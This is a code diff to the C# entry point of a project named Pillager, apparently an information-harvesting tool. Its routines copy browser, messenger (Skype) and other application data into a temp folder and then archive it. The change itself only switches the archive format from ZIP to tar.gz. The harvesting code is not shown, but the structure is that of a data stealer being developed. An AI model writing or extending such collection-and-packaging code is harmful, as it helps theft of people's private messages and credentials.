@@ -1,8 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
-using System.IO.Compression;
+﻿using System.IO;
 using Pillager.Browsers;
+using Pillager.Helper;
 using Pillager.Messengers;
 using Pillager.Others;
 using Pillager.Tools;
@@ -14,7 +12,7 @@ namespace Pillager
         static void Main(string[] args)
         {
             string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-            string savezippath = savepath + ".zip";
+            string savezippath = savepath + ".tar.gz";
             if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
@@ -38,8 +36,8 @@ namespace Pillager
             Skype.Save(savepath);
             Enigma.Save(savepath);
 
-            //ZIP
-            ZipFile.CreateFromDirectory(savepath, savezippath);
+            //Tar.gz
+            Tar.Pack(savepath, savezippath);
             Directory.Delete(savepath, true);
         }
     }
